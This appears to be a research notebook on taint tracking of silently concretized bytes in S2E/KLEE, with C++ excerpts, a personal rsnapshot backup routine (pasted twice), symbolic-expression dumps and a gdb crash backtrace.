   assert(w == NumBytes * 8 && "Invalid write size!");
   for (unsigned i = 0; i != NumBytes; ++i) {
     unsigned idx = Context::get().isLittleEndian() ? i : (NumBytes - i - 1);
     write8(AddExpr::create(offset, ConstantExpr::create(idx, Expr::Int32)),
            ExtractExpr::create(value, 8 * i, Expr::Int8));
   }
 }
 



this is the one that S2EExecutionState::writeCpuRegisterRaw calls: 
 void ObjectState::write(unsigned offset, ref<Expr> value) {
   // Check for writes of constant values.
   if (ConstantExpr *CE = dyn_cast<ConstantExpr>(value)) {
     Expr::Width w = CE->getWidth();
     if (w <= 64) {
       uint64_t val = CE->getZExtValue();
       switch (w) {
       default: assert(0 && "Invalid write size!");
       case  Expr::Bool:
       case  Expr::Int8:  write8(offset, val); return;
       case Expr::Int16: write16(offset, val); return;
       case Expr::Int32: write32(offset, val); return;
       case Expr::Int64: write64(offset, val); return;
       }
     }
   }

   // Treat bool specially, it is the only non-byte sized write we allow.
   Expr::Width w = value->getWidth();
   if (w == Expr::Bool) {
     write8(offset, ZExtExpr::create(value, Expr::Int8));
     return;
   }

   // Otherwise, follow the slow general case.
   unsigned NumBytes = w / 8;
   assert(w == NumBytes * 8 && "Invalid write size!");
   for (unsigned i = 0; i != NumBytes; ++i) {
     unsigned idx = Context::get().isLittleEndian() ? i : (NumBytes - i - 1);
     write8(offset + idx, ExtractExpr::create(value, 8 * i, Expr::Int8));
   }
 }
 
 


10Apr2014
Backup Routine
I am using the 1TB Seagate from Dr. Wang as the primary backup. Backups to it are done via rsnapshot and there are two sets of backups on this disk. The first is from the Host machine (Florida) and it should only be ran whenever the Guest (s2e-demo) has been suspended, called flasuspended. The second is from the Guest machine (s2e-demo) directly to the disk.

The first set (initiated on the Host, florida), has 1 type:
1) ~/bin/backupDasos.sh
Run only with the Guest suspended (~/bin/0suspendS2E-demo) and with Seagate plugged in (after Guest is not running). The script will mount the seagate (which has an fstab entry by UUID to /mnt/local.backup) run rsnapshot flasuspended, then unmount the seagate. The /etc/rsnapshot.conf on florida backs up /etc and /home/rfarley3 which contains the S2E virtual machine and the host-guest (hgfs) shared folder (florida:~/Downloads/dasos/). Optionally restart guest with ~/bin/0resumeS2E-demo.

The second set (initiated on the Guest, s2e-demo) has 3 different types:
1) make backup
Run at any time. This does a non-delete rsync (so old files/dirs are not deleted/pruned even if they don't exist in the current version) to two places. The first is the host-guest (hgfs) shared folder (florida:~/Downloads/dasos) (note that this data is then written to the 1TB drive via flasuspended); and the second is to a remote file server, for me at my home this is my router with an attached usb drive. The hgfs rsync excludes core files. The remote rsync write excludes core, s2e-out*, *.qcow2 (but all were included in the initial sync, so you can still find s2e-waiting-DNM-original.qcow2 and s2e-waiting.qcow2 there).

2) ./dailyCommit.sh
Requires 1TB HDD to be connected while guest is running; there is an autoConnect for that HDD's USB vid and pid. This script mounts the drive, runs rsnapshot -c rsnapshot-s2e-commit daily, unmounts the drive. This rsnapshot captures /etc and /mnt/RJFDasos and should be used for stable dailies (when code is in completely stable condition). After every so 7 or so dailies, do a rsnapshot -c rsnapshot-s2e-commit daily && rsnapshot -c rsnapshot-s2e-commit weekly. After every 4 or so do a monthly; system will store up to 3 monthlies.

3) ./dirtyCommit.sh
Requires 1TB HDD to be connected while guest is running. rsnapshot -c rsnapshot-s2e-dirty dirty, which holds 28 versions (allowing 7 days if called every 4 hrs). This is done so that dirties never taint dailies (and thus weeklies nor monthlies). There are no other intervals in this set, just 'dirty.'

General plan:
Every so often while coding, run make backup. At the end of each day if the code is not stable run dirtyCommit; else if stable run dailyCommit (and then if end of week run weekly, end of month run monthly). Whenever the guest is suspended back up host with backupDasos.

If data failure occurs:
Restore host with backupDasos repository. This will give a baseline for guest (bc VMdisks are covered by backupDasos). 
Restore Guest with most recent daily, adding in dirty as necessary.
If Host and 1TB drive are toasted, rebuild host manually. Download S2E-demo VM. Add vmdisk, automount to /mnt/RJFDasos with link from ~/s2e/dasos. Get dirty guest from remote system into /mnt/RJFDasos.
What version of OS for the Host am I using? Follow install notes in this document.
Get a host baseline onto remote drive (include /etc and license files, important from /home, and very important /VirtualMachine/S2E-demo). If that happens then total loss means restoring remote baseline and restoring remote dirty. i : (NumBytes - i - 1);
     write8(offset + idx, ExtractExpr::create(value, 8 * i, Expr::Int8));
   }
 }
 
 


10Apr2014
Backup Routine
I am using the 1TB Seagate from Dr. Wang as the primary backup. Backups to it are done via rsnapshot and there are two sets of backups on this disk. The first is from the Host machine (Florida) and it should only be ran whenever the Guest (s2e-demo) has been suspended, called flasuspended. The second is from the Guest machine (s2e-demo) directly to the disk.

The first set (initiated on the Host, florida), has 1 type:
1) ~/bin/backupDasos.sh
Run only with the Guest suspended (~/bin/0suspendS2E-demo) and with Seagate plugged in (after Guest is not running). The script will mount the seagate (which has an fstab entry by UUID to /mnt/local.backup) run rsnapshot flasuspended, then unmount the seagate. The /etc/rsnapshot.conf on florida backs up /etc and /home/rfarley3 which contains the S2E virtual machine and the host-guest (hgfs) shared folder (florida:~/Downloads/dasos/). Optionally restart guest with ~/bin/0resumeS2E-demo.

The second set (initiated on the Guest, s2e-demo) has 3 different types:
1) make backup
Run at any time. This does a non-delete rsync (so old files/dirs are not deleted/pruned even if they don't exist in the current version) to two places. The first is the host-guest (hgfs) shared folder (florida:~/Downloads/dasos) (note that this data is then written to the 1TB drive via flasuspended); and the second is to a remote file server, for me at my home this is my router with an attached usb drive. The hgfs rsync excludes core files. The remote rsync write excludes core, s2e-out*, *.qcow2 (but all were included in the initial sync, so you can still find s2e-waiting-DNM-original.qcow2 and s2e-waiting.qcow2 there).

2) ./dailyCommit.sh
Requires 1TB HDD to be connected while guest is running; there is an autoConnect for that HDD's USB vid and pid. This script mounts the drive, runs rsnapshot -c rsnapshot-s2e-commit daily, unmounts the drive. This rsnapshot captures /etc and /mnt/RJFDasos and should be used for stable dailies (when code is in completely stable condition). After every so 7 or so dailies, do a rsnapshot -c rsnapshot-s2e-commit daily && rsnapshot -c rsnapshot-s2e-commit weekly. After every 4 or so do a monthly; system will store up to 3 monthlies.

3) ./dirtyCommit.sh
Requires 1TB HDD to be connected while guest is running. rsnapshot -c rsnapshot-s2e-dirty dirty, which holds 28 versions (allowing 7 days if called every 4 hrs). This is done so that dirties never taint dailies (and thus weeklies nor monthlies). There are no other intervals in this set, just 'dirty.'

General plan:
Every so often while coding, run make backup. At the end of each day if the code is not stable run dirtyCommit; else if stable run dailyCommit (and then if end of week run weekly, end of month run monthly). Whenever the guest is suspended back up host with backupDasos.

If data failure occurs:
Restore host with backupDasos repository. This will give a baseline for guest (bc VMdisks are covered by backupDasos). 
Restore Guest with most recent daily, adding in dirty as necessary.
If Host and 1TB drive are toasted, rebuild host manually. Download S2E-demo VM. Add vmdisk, automount to /mnt/RJFDasos with link from ~/s2e/dasos. Get dirty guest from remote system into /mnt/RJFDasos.
What version of OS for the Host am I using? Follow install notes in this document.
Get a host baseline onto remote drive (include /etc and license files, important from /home, and very important /VirtualMachine/S2E-demo). If that happens then total loss means restoring remote baseline and restoring remote dirty.


29May2014
Here is the approximate algorithm we use to obtain the taint trace.

The user uses the conf.lua to set what bytes are symbolic, when.
The system makes a label for that byte. The method consists of adding a labeled klee::ReadExpr to the concrete value. For example, a byte with value 0x3 that is named data_x becomes (Add (w8 3) (Read w8 0 data_x)). Note that we append an 4 digit index (0000) and S2E inserts its own naming conventions (v1_*_1), so the label will actually be v1_data_x0000_1
If the label exists on bytes that are executed as code, the system (klee) will silently concretize them. 
To detect silent concretization, we have a signal event that emits the address, the expression that was silently concretized, the value that it was concretized to, and the system's reason (a string that says why it was silently concretized, in our tests, it is "memory access from concrete code"). The address is added to the vector concretize_trace, and the concrete value in memory is overwritten with a symbolic value.

on each oTBS concretize_trace is appended with a 0 to indicate boundaries

oDMA, if it is a write done by an insn that had a byte concretized (for each concretize_trace see if it's basePC matches data_write.other_pc (the addr of the insn that did that write) ), then for the length of the data written, taintMem each byte by concretize_trace[i]. Note that a 4B concretize would result in all 4B in memory having all 4 labels (as opposed to each byte only having 1 label).

oEIE, for each item in concretize_trace back unil the last boundary (== 0), if the addr is between pc and pc+pc.len, then we just executed an instruction that was silently concretized. For each current trans block register trace (curr_tb_reg_trace), if it's a write and the writer's pc == pc, then this instruction wrote to a register. So, bc of the silent concretization of the insn, that register needs to be tainted. We append curr_tb_reg_trace[j] to last_insn_reg_write_trace. Note that a 4B concretize would result in each of the concretize tainting the register (so all 4B would have all 4 labels)(as opposed to each byte only having 1 label). Problem may exist if oTBS wasn't called, therefore no boundaries to stop searching concretize_trace.

oEIS, if last_insn_reg_write_trace.size > 0, then switch to symbolic mode. System will retranslate block as concrete, then symbolic, then reach oEIS again, skipping the jumpToSymbolicCpp, where it calls enforceTaints (vector<data_instance> last_insn_reg_write_trace);

enforceTaints is given a vector<data_instance>reg_writes (each element contains which register and what src insn and what src byte was involved), for each of these reg writes, for each label at the src byte, taint the reg with "prop_" + label_str via enforceTaint.

enforceTaint reads each byte of the register as an expr, then adds orig_expr and label as a new expr which is written to that byte.

oEIE last_insn_reg_write_trace is cleared.

on each oTBS curr_tb_reg_trace is cleared.
on each oTRA curr_tb_reg_trace is appended to note the reg read/write.
on each oRA curr_tb_reg_trace is printed for accesses that were done by current pc.



I removed teh if !found condition in oEIE so all oSCs are stored within last_insn_reg_write_trace







 >> monitorRegister _EAX word value inside is 0x00000004 and its symb expr is: 
 
 (Concat w32 (Extract w8 24 N0:(And w32 (Or w32 (Concat w32 N1:(Read w8 0 v13_prop_prop_prop_code_Key0000_13)
                                                             (Concat w24 N1 
                                                                         (Concat w16 N1 
                                                                                     (w8 0))))
                                                  (w32 4)
                                          )
                                          (w32 4294967044)
                                )
               )
               (Concat w24 (Extract w8 16 N0)
                           (Concat w16 N1 
                                       (Add w8 (w8 4) N1))))
 >> monitorRegister _EBX word value inside is 0x00000000
 >> monitorAddresses trans block boundary



(Extract w8 0 (Add w32 
                       (Concat w32 N0:(Add w8 (w8 92) (Read w8 0 v5_prop_code_Key0003_5))
                                   (w24 2013842))
                       (Concat w32 (Extract w8 24 (Xor w32 (w32 3085654150) (Concat w32 N0 (w24 0))))
                                   (w24 16114196))
               )
)


(Add w32 (Concat w32 N0:(Add w8 (w8 92) (Read w8 0 v5_prop_code_Key0003_5))
                     (w24 2013842))
         (Concat w32 (Extract w8 24 (Xor w32 (w32 3085654150) (Concat w32 N0 (w24 0))))
                     (w24 16114196)))
                     
                     
                     
                     
                     
                     
                     (Extract w8 8 (Add w32 N0:(Concat w32 (Add w8 (w8 72)
                                                                   N1:(Add w8 
                                                                              (Add w8 
                                                                                      (Read w8 0 v5_prop_code_Key0003_5) 
                                                                                      (Read w8 0 v9_prop_prop_code_Key0001_9))
                                                                              (Read w8 0 v10_prop_prop_code_Key0000_10)))
                                                            (Concat w24 (Add w8 (w8 20) 
                                                                                 N1)
                                                                         (Concat w16 (Add w8 (w8 156) 
                                                                                              N1) 
                                                                                      (Add w8 (w8 166) 
                                                                                              N1))))
                                                (Xor w32 (w32 2284176821) N0)))


[s2e@s2e:~/s2e/dasos]$ ./backtrace.sh 
[New Thread 16873]

warning: Can't read pathname for load map: Input/output error.
Core was generated by `/home/s2e/s2e/dasos/s2e/build/qemu-release/i386-s2e-softmmu/qemu -s2e-config-fi'.
Program terminated with signal 11, Segmentation fault.
#0  0x00002af85244ffdb in ?? () from /lib/libgcc_s.so.1
#0  0x00002af85244ffdb in ?? () from /lib/libgcc_s.so.1
#1  0x00002af852450b0c in _Unwind_Backtrace () from /lib/libgcc_s.so.1
#2  0x00002af85275669e in backtrace () from /lib/libc.so.6
#3  0x00002af8526c444f in ?? () from /lib/libc.so.6
#4  0x00002af852756537 in __fortify_fail () from /lib/libc.so.6
#5  0x00002af852756500 in __stack_chk_fail () from /lib/libc.so.6
#6  0x0000000000744487 in s2e::S2EExternalDispatcher::runProtectedCall (this=0x2af84fb0d970, f=0x0, args=<value optimized out>) at /mnt/RJFDasos/s2e/s2e/qemu/s2e/S2EExecutor.cpp:287
#7  0x0000002e00000030 in ?? ()
#8  0x0000003000000030 in ?? ()
#9  0x0000003000000030 in ?? ()
#10 0x00007fff00000030 in ?? ()
#11 0x000000000060e1dd in klee::ConstantExpr::alloc(llvm::APInt const&) ()
#12 0x0000000000000002 in ?? ()
#13 0x0000000000000000 in ?? ()

[s2e@s2e:~/s2e/dasos]$ ./searchSource.sh runProtectedCall
/home/s2e/s2e/dasos/s2e/./s2e/klee/lib/Core/ExternalDispatcher.cpp:174:  return runProtectedCall(dispatcher, args);
/home/s2e/s2e/dasos/s2e/./s2e/klee/lib/Core/ExternalDispatcher.cpp:180:bool ExternalDispatcher::runProtectedCall(Function *f, uint64_t *args) {
/home/s2e/s2e/dasos/s2e/./s2e/klee/include/klee/ExternalDispatcher.h:38:    virtual bool runProtectedCall(llvm::Function *f, uint64_t *args);
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/S2EExecutor.cpp:213:    virtual bool runProtectedCall(llvm::Function *f, uint64_t *args);
/home/s2e/s2e/dasos/s2e/./s2e/qemu/s2e/S2EExecutor.cpp:240:bool S2EExternalDispatcher::runProtectedCall(Function *f, uint64_t *args) {
[s2e@s2e:~/s2e/dasos]$ 



(Add w32 (EAX)
         (EBX+0x14)
EAX:
Concat w32 N0:(Add w8 (w8 92) (Read w8 0 v5_prop_code_Key0003_5))
                     (w24 2013842)
EBX+0x14
Concat w32 (Extract w8 24 (Xor w32 (w32 3085654150) (Concat w32 N0 (w24 0))))
                     (w24 16114196))
                     
                     
   oEIS
>> monitorRegister _EAX word value inside is 0x???????? and its symb expr is:
   (Concat w32 (Add w8 (w8 92) (Read w8 0 v5_prop_code_Key0003_5))
               (Concat w24 (Add w8 (w8 30) (Read w8 0 v6_prop_code_Key0002_6))
                           (Concat w16 (Add w8 (w8 186) (Read w8 0 v7_prop_code_Key0001_7))
                                       (Add w8 (w8 146) (Read w8 0 v8_prop_code_Key0000_8)))))
   oEIE
>> monitorRegister _EAX word value inside is 0x48149ca6 and its symb expr is:
(Add w32 
   (Concat w32 (Add w8 (w8 92) (Read w8 0 v5_prop_code_Key0003_5))
               (w24 2013842))
   (Concat w32 (Extract w8 24 (Xor w32 (w32 3085654150) (Concat w32 (Add w8 (w8 92) (Read w8 0 v5_prop_code_Key0003_5) (w24 0))))
               (w24 16114196)))
               
   (Concat w32 (Add w8 (w8 XOR_VAL) (Read w8 0 v5_prop_code_Key0003_5))
               (w24 16114196))
               
               
188 key0000 val 0x14 